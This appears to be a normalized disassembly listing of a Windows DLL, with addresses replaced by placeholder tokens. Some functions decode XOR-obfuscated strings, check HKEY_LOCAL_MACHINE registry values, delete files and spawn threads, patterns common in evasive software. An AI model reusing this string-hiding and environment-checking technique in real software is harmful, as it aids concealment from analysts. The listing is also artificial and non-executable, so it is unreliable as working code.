mov [ ebp - 0xc8 ] eax
call sub_100698c0
lea edx [ ebp - 0x144 ]
push edx
call esi
lea eax [ ebp - 0x154 ]
push eax
call esi
lea ecx [ ebp - 0x164 ]
push ecx
mov [ ebp - 0x4 ] bl
call esi
mov eax [ ebp - 0xc0 ]
push eax
cmp [ ebp - 0xc8 ] ebx
jge r-xdata
sub_10055ab0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10026320
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_10055ae0
push ebp
mov ebp esp
sub esp 0x2b0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfff7
and edx 0xff
mov [ ebp + eax * 2 - 0x44 ] dx
inc eax
cmp eax 0x19
jb r-xdata
push esi
mov esi [ RegOpenKeyExW@IAT ]
lea ecx [ ebp - 0x2ac ]
push ecx
push 0x1
xor eax eax
push eax
lea edx [ ebp - 0x44 ]
push edx
push 0x80000002
mov [ ebp - 0x12 ] ax
call esi
test eax eax
jne r-xdata
lea edx [ ebp - 0xa0 ]
mov eax 0x5
call sub_10037e30
lea ecx [ ebp - 0x2ac ]
push ecx
push 0x1
push 0x0
push edx
push 0x80000002
call esi
test eax eax
jne r-xdata
mov eax [ ebp - 0x2ac ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
movzx edx ax
mov eax edx
push edi
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x2a8 ]
[ edi ]
lea edx [ ebp - 0x68 ]
mov eax 0x9
mov [ ebp - 0x2b0 ] 0x206
call sub_10037e30
lea eax [ ebp - 0x2b0 ]
push eax
mov eax [ ebp - 0x2ac ]
lea ecx [ ebp - 0x2a8 ]
push ecx
push 0x0
push 0x0
push edx
push eax
call [ RegQueryValueExW@IAT ]
pop edi
test eax eax
je r-xdata
lea edx [ ebp - 0x2a8 ]
push edx
call [ CharUpperW@IAT ]
lea edx [ ebp - 0x10 ]
mov eax 0x27
call sub_10037e30
mov eax edx
push eax
lea ecx [ ebp - 0x2a8 ]
push ecx
call sub_1000b388
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x2ac ]
push ecx
jmp r-xdata
mov eax [ ebp - 0x2ac ]
push eax
mov edx [ ebp - 0x2ac ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
call [ RegCloseKey@IAT ]
sub_10055c60
push ebp
mov ebp esp
sub esp 0x128
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test esi esi
jne r-xdata
lea edx [ ebp - 0x98 ]
mov eax 0xcf
call sub_10069020
push rw-data
push esi
mov ecx edx
call sub_1001f770
add esp 0x8
test eax eax
je r-xdata
lea eax [ esi + 0x1 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xe0 ]
mov eax 0x102
call sub_10069020
push rw-data
push esi
mov ecx edx
call sub_1001f770
add esp 0x8
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x128 ]
mov eax 0xc5
call sub_10069020
push rw-data
push esi
mov ecx edx
call sub_1001f770
add esp 0x8
test eax eax
je r-xdata
mov eax 0x3
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x50 ]
mov eax 0x125
call sub_10069020
push rw-data
push esi
mov ecx edx
call sub_1001f770
mov ecx [ ebp - 0x4 ]
add esp 0x8
neg eax
sbb eax eax
xor ecx ebp
and eax 0x5
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax 0x4
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10055d5f
push 0x30
mov eax sub_10085e5f
call sub_10047689
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
and [ ebp - 0x24 ] 0x0
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] eax
movsb [ edi ] [ esi ]
mov [ ebp - 0x20 ] 0xf
mov [ ebp - 0x34 ] 0x0
mov al [ ebp + 0x24 ]
and [ ebp - 0x4 ] 0x0
test al al
jne r-xdata
mov [ ebp - 0x16 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x15 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x16 ] al
jmp r-xdata
push eax
push ebx
lea eax [ ebp - 0x18 ]
push eax
push [ ebp - 0x24 ]
push ecx
call sub_1004ad03
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
lea ecx [ ebp - 0x34 ]
push 0x10
pop edi
cmp [ ebp - 0x20 ] 0x10
mov ebx [ ebp - 0x34 ]
jae r-xdata
add edi edi
jmp r-xdata
dec esi
jne r-xdata
lea ebx [ ebp - 0x34 ]
jmp r-xdata
push 0x0
push edi
lea ecx [ ebp - 0x34 ]
call sub_10042a70
cmp [ ebp - 0x20 ] 0x10
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp - 0x34 ]
jae r-xdata
inc ebx
movzx eax [ ebx ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100637b6
mov eax [ ebp + 0xc ]
mov esi [ ebp - 0x38 ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x34 ]
mov [ esi + 0x4 ] eax
call sub_10005b50
mov eax esi
call sub_100262c3
retn 0x20
sub_10055e2a
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_10055e80
push ecx
push ebx
push edi
xor edi edi
mov ebx ecx
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
push eax
mov edx ebx
mov ecx esi
mov [ esi + 0x54 ] edi
call sub_10052c10
mov [ esi + 0x4 ] 0x3
cmp [ ebx + 0x84 ] 0x8
jb r-xdata
add ebx 0x70
mov ebx [ ebx + 0x70 ]
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x14 ] eax
call sub_1007f580
add esp 0xc
pop edi
mov eax esi
pop ebx
pop ecx
retn
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
sub_10055f13
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x90 ] eax
mov eax [ esi + 0x1c ]
push edi
mov [ ebp - 0x8c ] ecx
mov ecx [ esi + 0x18 ]
mov edi 0x2000
test eax eax
jg r-xdata
mov ebx ecx
mov [ ebp - 0x8 ] eax
test eax eax
jl r-xdata
jl r-xdata
mov [ ebp - 0x88 ] ebx
push 0x24
pop eax
jg r-xdata
test [ esi + 0x14 ] edi
jne r-xdata
test ecx ecx
jne r-xdata
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ ebp - 0x88 ] eax
jmp r-xdata
cmp ebx eax
jbe r-xdata
push 0x6
pop ecx
xor eax eax
mov [ ebp - 0x79 ] 0x0
jmp r-xdata
mov [ ebp - 0x79 ] 0x1
fchs
mov eax [ ebp - 0x88 ]
mov ecx [ esi + 0x14 ]
cdq
sub ebx eax
sbb [ ebp - 0x8 ] edx
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov eax ecx
and eax 0x3000
cmp eax edi
jne r-xdata
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop edi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ ebp - 0x80 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fdiv st2
add [ ebp - 0x80 ] edi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x88 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x4c
push eax
push [ ebp - 0x8c ]
call sub_1005aa50
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_1000f103
push eax
push ebx
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x90 ]
push [ ebp - 0x8c ]
call sub_10014c00
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x90 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x1c
fchs
jmp r-xdata
jg r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx edi
jb r-xdata
cmp [ ebp - 0x84 ] edx
jae r-xdata
add ebx 0xfffffff6
fmul st1
adc [ ebp - 0x8 ] 0xffffffff
add [ ebp - 0x84 ] edi
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
jge r-xdata
sub_100560ef
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100560bd
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
pop ecx
sub_10056120
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
push edi
call sub_1005dd20
push edi
call sub_1000ac10
push edi
call sub_100298f0
mov esi [ ebp + 0x18 ]
add esp 0xc
mov [ esi ] 0xffffffff
mov [ esi + 0x4 ] 0xffffffff
push edi
cmp eax [ ebp + 0x10 ]
jne r-xdata
call sub_100298f0
inc eax
add esp 0x4
cmp eax 0x3d
ja r-xdata
call sub_10047210
add esp 0x4
pop edi
mov [ esi ] 0xffffffff
mov eax 0x1
pop esi
pop ebp
retn
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push esi
push edx
push eax
call sub_1007eb60
add esp 0xc
pop edi
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_100561d0 ]
jmp [ eax * 4 + jump_table_100561c4 ]
push edi
call sub_10047210
add esp 0x4
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push ecx
mov ebx edi
call sub_1007e840
add esp 0x8
pop ebx
pop edi
pop esi
pop ebp
retn
sub_1005620e
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003020f
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_100562b0
push ebp
mov ebp esp
sub esp 0x228
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov ebx ecx
lea ecx [ ebp - 0x220 ]
xor edi edi
push ecx
lea edx [ ebp - 0x218 ]
push edx
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x228 ] edi
mov [ ebp - 0x218 ] edi
mov [ ebp - 0x220 ] edi
call sub_100505a0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x220 ]
mov esi [ ebp - 0x218 ]
lea eax [ ebp - 0x21c ]
push eax
push ecx
push esi
lea ecx [ ebp - 0x228 ]
mov edx ebx
call sub_10057700
test eax eax
je r-xdata
lea eax [ edi + 0x1 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x218 ]
mov eax 0x114
call sub_10069020
push edx
mov eax edx
push eax
mov ecx edx
mov edx [ rw-data ]
push ecx
push 0x1
push 0x1
push edx
lea eax [ ebp - 0x214 ]
mov [ ebp - 0x224 ] 0x1
call sub_1005bf30
test eax eax
jne r-xdata
cmp esi edi
je r-xdata
mov ebx [ HeapFree@IAT ]
cmp esi edi
je r-xdata
mov eax [ ebp - 0x228 ]
mov ecx [ ebp - 0x21c ]
push eax
push ecx
lea eax [ ebp - 0x214 ]
call sub_1002f360
add esp 0x8
mov [ ebp - 0x224 ] eax
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
push esi
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x21c ]
cmp eax edi
je r-xdata
push esi
push edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp [ ebp - 0x224 ] edi
je r-xdata
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
lea edx [ ebp - 0x214 ]
push edx
call sub_10050cb0
test eax eax
je r-xdata
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x214 ]
push ecx
call [ DeleteFileW@IAT ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x214 ]
push eax
call [ DeleteFileW@IAT ]
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
sub_10056464
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_10016734
mov [ esi ] ax
add esi 0x2
pop ecx
pop ecx
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_100564a0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0x94
cmp [ esi + 0x14 ] 0x8
mov ebx eax
jb r-xdata
push edi
xor edi edi
mov edx 0x418f
sub esi ebx
mov esi [ esi ]
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
xor edx edx
test edi edi
mov [ eax ] dx
pop edi
js r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x28 ]
cmp eax 0x13
je r-xdata
lea ecx [ edx + 0x7fffbe6f ]
test ecx ecx
je r-xdata
jmp r-xdata
mov eax 0x418f
mov ecx ebx
cmp eax 0x14
jne r-xdata
test eax eax
je r-xdata
add ecx 0x2
dec eax
jne r-xdata
cmp [ esi + 0x3c ] 0x0
jbe r-xdata
mov ecx 0x418f
sub ecx eax
mov eax 0x418f
sub eax ecx
push r--data
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_10072780
test eax eax
js r-xdata
cmp [ ecx ] dx
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax 0x418f
mov ecx ebx
cmp [ esi + 0x84 ] 0x8
jb r-xdata
test eax eax
je r-xdata
add ecx 0x2
dec eax
jne r-xdata
lea edx [ esi + 0x70 ]
mov edx [ esi + 0x70 ]
jmp r-xdata
mov ecx 0x418f
sub ecx eax
mov eax 0x418f
sub eax ecx
push r--data
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_10072780
test eax eax
js r-xdata
cmp [ ecx ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
test eax eax
je r-xdata
add ecx 0x2
dec eax
jne r-xdata
mov eax 0x418f
mov ecx ebx
mov edi edi
cmp [ esi + 0x40 ] 0x8
lea eax [ esi + 0x2c ]
jb r-xdata
mov ecx 0x418f
sub ecx eax
mov eax 0x418f
push edx
sub eax ecx
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_10072780
test eax eax
js r-xdata
cmp [ ecx ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
push eax
mov esi 0x418f
call sub_10050c60
mov eax [ eax ]
sub_10056610
push ebp
mov ebp esp
push ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0x4 ]
lea edx [ esi + 0xc ]
push edx
push ecx
push eax
call sub_1001feb0
mov edx [ esi ]
push edx
call sub_1000a86e
add esp 0x14
sub_1005664f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push 0x0
push 0x1
call sub_10069470
cmp [ esi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
mov [ edi ] eax
and [ esi ] 0x0
mov eax [ esi + 0x10 ]
lea eax [ eax + eax + 0x2 ]
push eax
push esi
push edi
call sub_1007ec40
add esp 0xc
jmp r-xdata
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
and [ esi + 0x10 ] 0x0
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
sub_100566b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086de0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x9249249
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax ebx
jae r-xdata
push r--data
call sub_10030594
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edi [ esi + 0xc ]
push ebx
mov ecx edi
call sub_1005f570
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push ebx
push 0x0
push edi
push eax
push ecx
push edx
mov [ ebp - 0x14 ] eax
call sub_10031f00
mov ebx [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add esp 0x18
add edi edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax * 8 ]
sub ecx eax
mov eax [ ebp - 0x14 ]
lea edx [ eax + ecx * 4 ]
lea ecx [ edi * 8 ]
sub ecx edi
mov [ esi + 0x8 ] edx
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x4 ] edx
mov [ esi ] eax
mov ecx [ ebp + 0x8 ]
push ecx
lea eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x4 ]
push eax
push ebx
call sub_10072070
mov edx [ esi ]
push edx
call sub_1000a86e
add esp 0x14
sub_100567c9
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_10056858
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
test edi edi
jne r-xdata
push esi
call sub_1004b450
push 0x214
push 0x1
call sub_100579de
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
xor eax eax
jmp r-xdata
push esi
call sub_1001b2d2
pop ecx
test ebx ebx
je r-xdata
call sub_1002d269
push [ eax + 0x6c ]
push esi
call sub_10034468
mov eax [ ebp + 0x14 ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi + 0x58 ] eax
mov eax [ ebp + 0x1c ]
pop ecx
pop ecx
mov [ esi + 0x54 ] edi
test eax eax
jne r-xdata
pop edi
pop ebx
pop ebp
retn
xor eax eax
push ebx
call sub_1005bae3
pop ecx
push eax
push [ ebp + 0x18 ]
push esi
push sub_1007f098
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CreateThread@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp + 0x10 ]
pop esi
call [ GetLastError@IAT ]
mov ebx eax
sub_10056900
push ebp
mov ebp esp
push 0xffffffff
push sub_10087982
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x38 ]
xor esi esi
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x30 ] edi
cmp ecx esi
je r-xdata
mov [ ebp - 0x4 ] esi
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + edi + 0xc ] esi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + edi + 0xc ] 0x0
sete cl
mov [ ebp - 0x2c ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
je r-xdata
mov eax [ eax + edi + 0x3c ]
cmp eax esi
je r-xdata
mov edx [ edi ]
mov ecx [ edx + 0x4 ]
mov edx [ ebp - 0x14 ]
add ecx edi
test edx edx
je r-xdata
mov ecx [ eax + 0x4 ]
lea edx [ ebp - 0x18 ]
push edx
add ecx edi
call sub_10007a10
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1001f400
mov [ ebp - 0x4 ] 0x1
mov ebx [ ebp - 0x18 ]
add esp 0x4
mov [ ebp - 0x24 ] eax
test ebx ebx
je r-xdata
mov esi eax
call sub_1006d8e0
mov [ ebp - 0x4 ] 0x5
call j_sub_1004131f
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x3
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + edi + 0x38 ]
movzx ecx [ ecx + edi + 0x40 ]
push edx
mov [ ebp - 0x20 ] 0x0
mov edx [ ebp - 0x20 ]
push edx
mov edx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x24 ]
add eax edi
push eax
lea esi [ ebp - 0x28 ]
call sub_1003a3f0
cmp [ eax ] 0x0
je r-xdata
push 0x0
lea ecx [ ebp - 0x1c ]
call sub_1000c927
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx edi
call sub_1003a960
push 0x0
call sub_10039ae0
or eax 0x4
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
mov esi [ ebx + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x1c ]
not esi
call sub_10003c9c
and esi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ ebx + 0x4 ] eax
sub_10056a2d
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
call sub_10039ae0
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_10056ad0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_10056b00
push ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffaa
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x10
jb r-xdata
push 0x1
xor eax eax
lea edx [ esi + 0x13c ]
push esi
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x8 ] ax
call sub_1004a7c0
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x80 ]
mov eax 0x105
call sub_1002f620
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10056b90
push ebp
mov ebp esp
push 0xffffffff
push sub_10086570
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x4
xor ebx ebx
push ebx
mov esi ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] r--data
jmp r-xdata
push 0x1c
lea edx [ ebp - 0x2c ]
push edx
